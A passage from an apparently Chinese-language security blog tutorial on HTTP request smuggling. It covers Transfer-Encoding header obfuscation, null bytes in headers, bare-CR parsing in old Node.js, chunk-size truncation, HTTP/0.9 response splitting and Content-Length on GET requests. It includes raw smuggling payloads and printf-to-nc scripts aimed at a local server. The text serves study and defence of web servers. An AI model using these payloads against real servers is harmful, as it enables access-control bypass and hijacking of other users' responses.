3.3.3</a> &#xFF1A;</p><blockquote><p>If a Transfer-Encoding header field is present in a request and the chunked transfer coding is not the final encoding, the message body length cannot be determined reliably; the server MUST respond with the 400 (Bad Request) status code and then close the connection.</p></blockquote><p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x5F53;&#x63A5;&#x53D7;&#x5230;<code>Transfer-Encoding: chunked, zorg</code>&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5E94;&#x8BE5;&#x8FD4;&#x56DE; 400 &#x9519;&#x8BEF;&#x3002;</p><p>&#x8FD9;&#x7C7B;&#x53EF;&#x4EE5;&#x6709;&#x5F88;&#x591A;&#x7ED5;&#x8FC7;&#xFF0C;&#x6BD4;&#x5982;&#xFF1A;</p><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: x</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding:[tab]chunked</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET / HTTP/1.1</span><br><span class="line"> Transfer-Encoding: chunked</span><br><span class="line"><span class="hljs-attribute">X</span>: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span></span><br><span class="line"> : chunked</span><br></pre></td></tr></table></figure><h3 id="Null-In-Headers"><a href="#Null-In-Headers" class="headerlink" title="Null In Headers"></a>Null In Headers</h3><p>&#x5728;&#x4E00;&#x4E9B;&#x7528; C &#x5199;&#x7684;&#x4E2D;&#x95F4;&#x4EF6;&#x670D;&#x52A1;&#x5668;&#x5F53;&#x4E2D;&#x6BD4;&#x8F83;&#x5BB9;&#x6613;&#x4EA7;&#x751F;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x56E0;&#x4E3A;<code>\0</code>&#x4EE3;&#x8868;&#x5B57;&#x7B26;&#x4E32;&#x7ED3;&#x675F;&#x6807;&#x5FD7;&#xFF0C;&#x5F53;&#x7528;&#x5728; header &#x91CC;&#x9762;&#xFF0C;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x7528;<code>\0</code>&#x5C31;&#x53EF;&#x80FD;&#x8BA9;&#x4E2D;&#x95F4;&#x4EF6;&#x51FA;&#x73B0;&#x4E00;&#x4E9B;&#x4E0D;&#x6B63;&#x5E38;&#x7684;&#x89E3;&#x6790;&#x3002;</p><p>&#x6BD4;&#x5982;&#x8BF4;&#xFF1A;</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># 2 responses instead of 3 (2nd query is wipped out by pound, used as a body)</span></span><br><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">&apos;GET / HTTP/1.1\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Host:localhost\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Content-\0dummy: foo\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;length: 56\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Transfer-Encoding: chunked\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Dummy:Header\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;0\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;GET /tmp HTTP/1.1\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Host:localhost\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Dummy:Header\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;GET /tests HTTP/1.1\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Host:localhost\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Dummy:Header\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line">| nc -q3 127.0.0.1 8080</span><br></pre></td></tr></table></figure><p>&#x6709;&#x4E9B;&#x4E2D;&#x95F4;&#x4EF6;&#x5904;&#x7406;&#x4EE5;&#x4E0A;&#x7684;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x5F53;&#x9047;&#x5230;<code>\0</code>&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x7EE7;&#x7EED;&#x6362;&#x884C;&#x8BFB;&#x53D6;&#xFF0C;&#x8FD9;&#x6837;&#x4E5F;&#x4F1A;&#x5BFC;&#x81F4;&#x4EA7;&#x751F;&#x89E3;&#x6790;&#x5DEE;&#x5F02;&#x3002;</p><h3 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h3><p>&#x6839;&#x636E; <a href="https://tools.ietf.org/html/rfc7230#section-3.5" target="_blank" rel="noopener">RFC7320 section-3.5</a>:</p><blockquote><p>Although the line terminator for the start-line and header fields is the sequence CRLF, a recipient MAY recognize a single LF as a line terminator and ignore any preceding CR.</p></blockquote><p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x9664;&#x4E86; CRLF &#x6211;&#x4EEC;&#x8FD8;&#x53EF;&#x4EE5;&#x7528; LF &#x4F5C;&#x4E3A; EOL&#xFF0C;&#x4F46;&#x662F;&#x5728; Node.js &lt; 5.6.0 &#x7684;&#x7248;&#x672C;&#xFF0C;&#x5BF9;&#x4E8E; CRLF &#x7684;&#x5904;&#x7406;&#x4E5F;&#x662F;&#x6BD4;&#x8F83;&#x6709;&#x8DA3;&#x7684;&#xFF1A;</p><figure class="highlight markdown hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="hljs-string">CR</span>] + ? == [<span class="hljs-string">CR</span>][<span class="hljs-symbol">LF</span>]//true</span><br></pre></td></tr></table></figure><p>&#x5047;&#x8BBE;&#x6211;&#x4EEC;&#x6709;&#x4E00;&#x4E2A;&#x6B63;&#x5E38;&#x89E3;&#x6790; CRLF &#x7684; Front &#x670D;&#x52A1;&#x5668;&#xFF0C;&#x540E;&#x7AEF;&#x662F;&#x6709;&#x8BE5;&#x6F0F;&#x6D1E;&#x7684; Node.js &#x670D;&#x52A1;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x9001;&#x4EE5;&#x4E0B;&#x8BF7;&#x6C42;&#xFF1A;</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host:localhost\r\n</span></span><br><span class="line"><span class="hljs-attribute">Dummy</span>: Header\rZTransfer-Encoding: chunked\r\n</span><br><span class="line"><span class="hljs-attribute">Content-length</span>: 52\r\n</span><br><span class="line">\r\n</span><br><span class="line"><span class="hljs-attribute">0\r\n</span></span><br><span class="line"><span class="hljs-attribute">\r\n</span></span><br><span class="line">GET /tmp HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host:localhost\r\n</span></span><br><span class="line"><span class="hljs-attribute">Dummy:Header\r\n</span></span><br></pre></td></tr></table></figure><p>Front &#x670D;&#x52A1;&#x5668;&#x5C31;&#x4F1A;&#x8BA4;&#x4E3A;<code>Dummy: Header\rZTransfer-Encoding: chunked\r\n</code>&#x662F;&#x4E00;&#x4E2A; header &#xFF0C;&#x4F7F;&#x7528; CL &#x5934;&#x89E3;&#x6790;&#xFF0C;&#x4F1A;&#x8BA4;&#x4E3A;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x800C; Node.js &#x4F1A;&#x8BA4;&#x4E3A;<code>\rZ</code>&#x662F;&#x4E00;&#x4E2A;&#x6362;&#x884C;&#xFF0C;&#x6309;&#x7167; TE &#x4F18;&#x5148;&#x4E8E; CL &#x7684;&#x89E3;&#x6790;&#x89C4;&#x5219;&#xFF0C;&#x8BA4;&#x4E3A;&#x8FD9;&#x662F;&#x4E24;&#x4E2A;&#x8BF7;&#x6C42;&#xFF0C;&#x5C31;&#x4EA7;&#x751F;&#x4E86;&#x89E3;&#x6790;&#x5DEE;&#x5F02;&#x3002;</p><h3 id="Size-Issue"><a href="#Size-Issue" class="headerlink" title="Size Issue"></a>Size Issue</h3><p>&#x8FD8;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x4E00;&#x4E9B;&#x7F16;&#x7801;&#x5757;&#x957F;&#x5EA6;&#x4EA7;&#x751F;&#x89E3;&#x6790;&#x5DEE;&#x5F02;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">&apos;GET / HTTP/1.1\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Host:localhost\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Transfer-Encoding: chunked\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Dummy:Header\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;0000000000000000000000000000042\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;GET /tmp/ HTTP/1.1\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Host:localhost\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Transfer-Encoding: chunked\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;0\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line">| nc -q3 127.0.0.1 8080</span><br></pre></td></tr></table></figure><p>&#x67D0;&#x4E9B;&#x4E2D;&#x95F4;&#x4EF6;&#x5728;&#x89E3;&#x6790;&#x5757;&#x5927;&#x5C0F;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x5C06;&#x957F;&#x5EA6;&#x5757;&#x5927;&#x5C0F;&#x957F;&#x5EA6;&#x8FDB;&#x884C;&#x622A;&#x65AD;&#xFF0C;&#x6BD4;&#x5982;&#x8FD9;&#x91CC;&#x8868;&#x73B0;&#x4E3A;&#x53EA;&#x53D6;<code>&apos;0000000000000000000000000000042</code>&#x4E3A;<code>00000000000000000</code>&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x4F1A;&#x8BA4;&#x4E3A;&#x8FD9;&#x662F;&#x4E24;&#x4E2A;&#x8BF7;&#x6C42;&#x4E86;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#x7684;&#x5757;&#x5927;&#x5C0F;&#x4E3A;0&#xFF0C;&#x7B2C;&#x4E8C;&#x4E2A;&#x5C31;&#x4F1A;&#x8BF7;&#x6C42;<code>/tmp</code>&#xFF0C;&#x5C31;&#x5BFC;&#x81F4;&#x4E86; HTTP Smuggling&#x3002;</p><h3 id="HTTP-Version"><a href="#HTTP-Version" class="headerlink" title="HTTP Version"></a>HTTP Version</h3><p>&#x8FD9;&#x4E2A;&#x4E3B;&#x8981;&#x662F;&#x7531;&#x4E8E; HTTP/0.9 &#x5F15;&#x8D77;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x6211;&#x4EEC;&#x5148;&#x6765;&#x770B;&#x770B; HTTP &#x51E0;&#x4E2A;&#x7248;&#x672C;&#x7684; example &#xFF1A;</p><p>HTTP v1.1</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n</span><br></pre></td></tr></table></figure><p>HTTP v1.0</p><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>HTTP v0.9</p><figure class="highlight routeros hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-builtin-name">GET</span> /foo\r\n</span><br></pre></td></tr></table></figure><p>&#x5E76;&#x4E14; HTTP/0.9 &#x8BF7;&#x6C42;&#x5305;&#x4E0E;&#x54CD;&#x5E94;&#x5305;&#x662F;&#x90FD;&#x6CA1;&#x6709; headers &#x7684;&#x6982;&#x5FF5;&#x7684;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x5982;&#x4E0B;&#xFF1A;</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130142331.png" alt></p><p>&#x56E0;&#x4E3A; HTTP/0.9 &#x54CD;&#x5E94;&#x5305;&#x6CA1;&#x6709; headers &#x7684;&#x7279;&#x6027;&#xFF0C;&#x5728; HTTP Smuggling &#x4E2D;&#x5229;&#x7528;&#x8D77;&#x6765;&#x4E5F;&#x5C31;&#x7279;&#x522B;&#x7684;&#x6709;&#x610F;&#x601D;&#x4E86;&#x3002;</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130143300.png" alt></p><p>&#x8FD9;&#x5F20;&#x56FE;&#x7684;&#x610F;&#x601D;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x5728; HTTP Smuggling &#x7684;&#x65F6;&#x5019;&#x4F7F;&#x7528; HTTP/0.9 &#x8FDB;&#x884C; Smuggle &#xFF0C;&#x8FD9;&#x5E76;&#x4E0D;&#x662F; HTTP/0.9 &#x6807;&#x51C6;&#x7684;&#x683C;&#x5F0F;&#xFF0C;&#x4F46;&#x662F;&#x7531;&#x4E8E;&#x4E00;&#x4E9B;&#x4E2D;&#x95F4;&#x4EF6;&#x5DF2;&#x7ECF;&#x4E0D;&#x652F;&#x6301;&#x76F4;&#x63A5;&#x89E3;&#x6790; HTTP/0.9 &#x7684;&#x6807;&#x51C6;&#x683C;&#x5F0F;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x8FD8;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x89E3;&#x6790;&#x8FD9;&#x79CD;&#x6307;&#x5B9A; HTTP version &#x7684;&#x60C5;&#x51B5;&#x3002;&#x4E8E;&#x662F;&#x5C31;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x4EE5;&#x4E0B;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#xFF1A;</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130143557.png" alt></p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130143626.png" alt></p><p>&#x4E0A;&#x9762;&#x4E24;&#x4E2A;&#x56FE;&#x5C55;&#x73B0;&#x4E86;&#x4E00;&#x4E2A;&#x5927;&#x81F4;&#x7684;&#x653B;&#x51FB;&#x6D41;&#x7A0B;&#xFF0C;chewy2.jpg &#x5F53;&#x4E2D;&#x7684; 24-33664 &#x5B57;&#x8282;&#x6709;&#x7740;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684; HTTP &#x54CD;&#x5E94;&#x62A5;&#x6587;&#xFF0C;&#x5F53; Golang &#x5728;&#x5904;&#x7406; HTTP/0.9 &#x7684;&#x65F6;&#x5019;&#xFF0C;&#x7531;&#x4E8E;&#x6211;&#x4EEC;&#x6307;&#x5B9A;&#x4E86;<code>Range: bytes=24-33664</code>&#xFF0C;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x83B7;&#x53D6;&#x54CD;&#x5E94;&#x62A5;&#x6587;&#x7684; 24-33664 &#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x83B7;&#x53D6;&#x4E86;&#x6211;&#x4EEC;&#x5B58;&#x653E;&#x5728;&#x56FE;&#x7247;&#x5F53;&#x4E2D;&#x7684; HTTP &#x62A5;&#x6587;&#xFF0C;&#x7136;&#x540E;&#x8FD4;&#x56DE;&#x7ED9; Golang &#xFF0C;Golang &#x5BF9;&#x4E8E; HTTP/0.9 &#x518D;&#x8FDB;&#x884C;&#x6807;&#x51C6;&#x5316;&#x53BB;&#x5934;&#x7684;&#x5904;&#x7406;&#xFF0C;&#x8FD9;&#x6837;&#x54CD;&#x5E94;&#x770B;&#x8D77;&#x6765;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x54CD;&#x5E94;&#x4E86;&#x3002;</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130153851.png" alt></p><p>&#x5F53;&#x4E00;&#x4E2A;&#x6B63;&#x5E38;&#x7528;&#x6237;&#x53BB;&#x8BF7;&#x6C42;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5982;&#x679C; Apache &#x91CD;&#x65B0;&#x4F7F;&#x7528;&#x4E86; TCP/IP &#x94FE;&#x63A5;&#xFF0C;&#x5C31;&#x4F1A;&#x5C06;&#x6211;&#x4EEC;&#x6784;&#x9020;&#x5728;&#x56FE;&#x7247;&#x5F53;&#x4E2D;&#x7684; HTTP &#x62A5;&#x6587;&#x5F53;&#x4F5C;&#x54CD;&#x5E94;&#x5305;&#x8FD4;&#x56DE;&#x7ED9;&#x7528;&#x6237;&#x3002;&#x8FD9;&#x4E5F;&#x662F;&#x4E00;&#x4E2A;&#x5F88;&#x5178;&#x578B;&#x7684; HTTP Response Splitting &#x7684;&#x601D;&#x8DEF;&#x3002;&#x5177;&#x4F53;&#x53EF;&#x4EE5;&#x770B;&#x770B;&#x89C6;&#x9891;&#x6F14;&#x793A; <a href="https://www.youtube.com/watch?v=lY_Mf2Fv7kI" target="_blank" rel="noopener">HTTP Smuggling Examples 2016</a></p><h3 id="Has-a-CL-in-GET"><a href="#Has-a-CL-in-GET" class="headerlink" title="Has a CL in GET"></a>Has a CL in GET</h3><p>&#x8FD9;&#x4E2A;&#x573A;&#x666F;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x5728; GET &#x8BF7;&#x6C42;&#x4E2D;&#x4F7F;&#x7528;&#x4E86; body &#xFF0C;&#x5E76;&#x4EE5; Content-Length &#x6307;&#x51FA;&#x4E86; body &#x7684;&#x957F;&#x5EA6;&#x3002;</p><blockquote><p>&#x200B;    &#x5176;&#x5B9E;&#x5728;&#x8FD9;&#x91CC;&#xFF0C;&#x5F71;&#x54CD;&#x5230;&#x7684;&#x5E76;&#x4E0D;&#x4EC5;&#x4EC5;&#x662F;GET&#x8BF7;&#x6C42;&#xFF0C;&#x6240;&#x6709;&#x4E0D;&#x643A;&#x5E26;&#x8BF7;&#x6C42;&#x4F53;&#x7684;HTTP&#x8BF7;&#x6C42;&#x90FD;&#x6709;&#x53EF;&#x80FD;&#x53D7;&#x6B64;&#x5F71;&#x54CD;&#xFF0C;&#x53EA;&#x56E0;&#x4E3A;GET&#x6BD4;&#x8F83;&#x5178;&#x578B;&#xFF0C;&#x6211;&#x4EEC;&#x628A;&#x5B83;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x4F8B;&#x5B50;&#x3002;</p></blockquote><p>&#x5728; <a href="https://tools.ietf.org/html/rfc7230#section-3.3.2" target="_blank" rel="noopener">RFC7230 Content-Length</a> &#x90E8;&#x5206;&#x63D0;&#x5230;&#xFF1A;</p><blockquote><p>&#x200B;    For example, a Content-Length header field is normally sent in a POST request even when the value is 0 (indicating an empty payload body).  A user agent SHOULD NOT send a Content-Length header field when the request message does not contain a payload body and the method semantics do not anticipate such a body.</p></blockquote><p>&#x5728;&#x6700;&#x65B0;&#x7684; <a href="https://tools.ietf.org/html/rfc7231#section-4.3.1" target="_blank" rel="noopener">RFC7231 4.3.1 GET</a> &#x4E2D;&#x4E5F;&#x4EC5;&#x4EC5;&#x63D0;&#x4E86;&#x4E00;&#x53E5;&#xFF1A;</p><blockquote><p>&#x200B;    A payload within a GET request message has no defined semantics; sending a payload body on a GET request might cause some existing implementations to reject the request.</p></blockquote><p>&#x5BF9;&#x4E8E;&#x7C7B;&#x4F3C;&#x62E5;&#x6709; body &#x5B57;&#x6BB5;&#x5E76;&#x4E14;&#x4EE5; Content-Length &#x6307;&#x51FA;&#x5176; body &#x957F;&#x5EA6;&#x7684;&#x8BF7;&#x6C42;&#xFF0C;RFC &#x5E76;&#x6CA1;&#x6709;&#x4E25;&#x683C;&#x7684;&#x8BF4;&#x660E; Server &#x5E94;&#x8BE5;&#x5982;&#x4F55;&#x53BB;&#x5904;&#x7406;&#xFF0C;&#x6240;&#x4EE5;&#x5927;&#x90E8;&#x5206;&#x4E2D;&#x95F4;&#x4EF6;&#x5BF9;&#x4E8E;&#x62E5;&#x6709; body &#x7684; GET &#x8BF7;&#x6C42;&#x4E5F;&#x662F;&#x8FDB;&#x884C;&#x4E86;&#x5BBD;&#x677E;&#x5904;&#x7406;&#xFF0C;&#x4F46;&#x662F;&#x4E5F;&#x662F;&#x90E8;&#x5206;&#x60C5;&#x51B5;&#xFF0C;&#x7531;&#x4E8E;&#x8FD9;&#x4E9B;&#x4E2D;&#x95F4;&#x4EF6;&#x6CA1;&#x6709;&#x4E00;&#x4E2A;&#x4E25;&#x683C;&#x7684;&#x6807;&#x51C6;&#x4F9D;&#x636E;&#xFF0C;&#x6240;&#x4EE5;&#x4E5F;&#x4F1A;&#x4EA7;&#x751F;&#x89E3;&#x6790;&#x5DEE;&#x5F02;&#x5BFC;&#x81F4; HTTP Smuggling &#x653B;&#x51FB;&#x3002;</p><p>&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x4E3E;&#x4E2A;&#x7B80;&#x5355;&#x4E14;&#x7406;&#x60F3;&#x5316;&#x7684;&#x4F8B;&#x5B50;&#xFF0C;Front &#x670D;&#x52A1;&#x5668;&#x5BF9;&#x4E8E; GET &#x8BF7;&#x6C42;&#x5141;&#x8BB8;&#x643A;&#x5E26; body &#xFF0C;&#x800C; Backend &#x670D;&#x52A1;&#x5668;&#x4F1A;&#x5FFD;&#x7565;&#x5E26; body &#x7684; GET &#x8BF7;&#x6C42;&#x3002;</p><p>&#x5F53;&#x6211;&#x4EEC;&#x53D1;&#x9001;&#x5982;&#x4E0B;&#x8BF7;&#x6C42;&#xFF1A;</p><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 41\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET /secret HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>&#x5F53; Front &#x670D;&#x52A1;&#x5668;&#x5904;&#x7406;&#x8FD9;&#x4E2A;&#x8BF7;&#x6C42;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x628A;&#x4EE5;&#x4E0A;&#x8FD9;&#x4E2A;&#x8BF7;&#x6C42;&#x5F53;&#x4F5C;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684;&#x8BF7;&#x6C42;&#x8F6C;&#x53D1;&#x7ED9; Backend &#x670D;&#x52A1;&#x5668;&#xFF0C;&#x800C; Backend &#x670D;&#x52A1;&#x6C42;&#x5728;&#x5904;&#x7406;&#x8FD9;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x628A;&#x8FD9;&#x4E2A;&#x8BF7;&#x6C42;&#x5F53;&#x4F5C;&#x4E24;&#x4E2A;&#x8BF7;&#x6C42;</p><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 41\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /secret HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>&#x8FD9;&#x6837;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x6210;&#x529F;&#x5730;&#x8FDB;&#x884C;&#x4E86;&#x4E00;&#x6B21; HTTP Smuggling&#xFF0C;&#x4ECE;&#x8FD9;&#x4E2A;&#x4F8B;&#x5B50;&#x5F53;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x4E0D;&#x96BE;&#x770B;&#x51FA;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x4E00;&#x4E2A;&#x573A;&#x666F;&#x5B58;&#x5728; HTTP Smuggling &#x6F0F;&#x6D1E;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x4E2A; Content-Length &#x6570;&#x636E;&#x5C31;&#x53D8;&#x5F97;&#x989D;&#x5916;&#x7684;&#x91CD;&#x8981;&#xFF0C;&#x56E0;&#x4E3A;&#x8FD9;&#x5F71;&#x54CD;&#x5230;&#x6211;&#x4EEC;&#x653B;&#x51FB;&#x662F;&#x5426;&#x6210;&#x529F;&#xFF0C;&#x80FD;&#x5426;&#x5C06;&#x6211;&#x4EEC;&#x7684; HTTP &#x8BF7;&#x6C42;&#x6210;&#x529F;&#x5730;&#x201C;&#x5D4C;&#x5165;&#x201D;&#x5728;&#x4E00;&#x4E2A; HTTP &#x8BF7;&#x6C42;&#x5F53;&#x4E2D;&#x3002;</p><p>&#x8FD9;&#x91CC;&#x7684;&#x8BA1;&#x7B97;&#x65B9;&#x6CD5;&#x4E0E;&#x4E4B;&#x524D;&#x7684;&#x7C7B;&#x4F3C;&#xFF0C;</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /secret HTTP/1.1\r\n--&gt;&quot;GET /secret HTTP/1.1&quot; &#x4E00;&#x5171;20&#x4E2A;&#x5B57;&#x7B26;&#xFF0C;&#x52A0;&#x4E0A;CRLF&#x4E00;&#x5171;22&#x4E2A;&#x5B57;&#x7B26;</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n--&gt;&quot;Host: example.com&quot; &#x4E00;&#x5171;17&#x4E2A;&#x5B57;&#x7B26;&#xFF0C;&#x52A0;&#x4E0A;CRLF&#x4E00;&#x5171;19&#x4E2A;&#x5B57;&#x7B26;</span><br></pre></td></tr></table></figure><p>22 + 19 = 41 &#x4E2A;&#x5B57;&#x8282;</p><h3 id="Two-Identical-Fields-CL"><a href="#Two-Identical-Fields-CL" class="headerlink" title="Two Identical Fields - CL"></a>Two Identical Fields - CL</h3><p>&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x4EE5; Content-Length &#x4E3E;&#x4F8B;&#xFF0C;&#x5728; <a href="https://tools.ietf.org/html/rfc7230#section-3.3.2" target="_blank" rel="noopener">RFC7230 section 3.3.2</a> &#x4E2D;&#xFF0C;</p><blockquote><p>If a message is received that has multiple Content-Length header fields with field-values consisting of the same decimal value, or a single Content-Length header field with a field value containing a list of identical decimal values (e.g., &#x201C;Content-Length: 42, 42&#x201D;), indicating that duplicate Content-Length header fields have been generated or combined by an 